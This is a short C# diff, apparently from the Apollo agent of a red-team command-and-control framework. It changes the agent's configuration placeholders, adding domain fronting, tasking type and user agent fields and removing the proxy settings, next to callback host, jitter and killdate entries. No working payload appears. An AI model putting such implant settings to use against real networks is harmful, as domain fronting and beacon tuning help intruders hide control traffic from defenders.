@@ -89,16 +89,15 @@ namespace Apollo
                         { "killdate", "-1" },
                         { "USER_AGENT", "Apollo-Refactor" },
 #else
+                        { "tasking_type", "tasking_type_here"},
                         { "callback_interval", "callback_interval_here" },
                         { "callback_jitter", "callback_jitter_here" },
                         { "callback_port", "callback_port_here" },
                         { "callback_host", "callback_host_here" },
-                        { "post_uri", "post_uri_here" },
+                        { "ENDPOINT_REPLACE", "ENDPOINT_REPLACE_here" },
                         { "encrypted_exchange_check", "encrypted_exchange_check_here" },
-                        { "proxy_host", "proxy_host_here" },
-                        { "proxy_port", "proxy_port_here" },
-                        { "proxy_user", "proxy_user_here" },
-                        { "proxy_pass", "proxy_pass_here" },
+                        { "domain_front", "domain_front_here" },
+                        { "USER_AGENT", "USER_AGENT_here" },
                         { "killdate", "killdate_here" },
                         HTTP_ADDITIONAL_HEADERS_HERE
 #endif
